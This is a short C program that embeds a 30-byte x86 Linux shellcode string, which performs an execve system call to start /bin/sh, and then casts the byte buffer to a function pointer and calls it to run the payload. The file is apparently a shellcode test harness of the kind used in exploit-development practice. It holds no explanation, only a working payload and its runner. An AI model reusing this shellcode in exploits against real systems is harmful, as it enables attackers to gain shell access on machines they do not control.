#include <stdio.h>
#include <string.h>


unsigned char shellcode[] = "\xeb\x10\x5e\x31\xc0\x88\x46\x07\x8b\x1e\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

void main(){
  printf("Shellcode length: %d\n", strlen(shellcode));
  // Declare a function pointer named ret
  // Then cast the shellcode pointer to the function pointer of the same size
  int (*ret)() = (int(*)())shellcode;
  // Call the function
  ret();
}
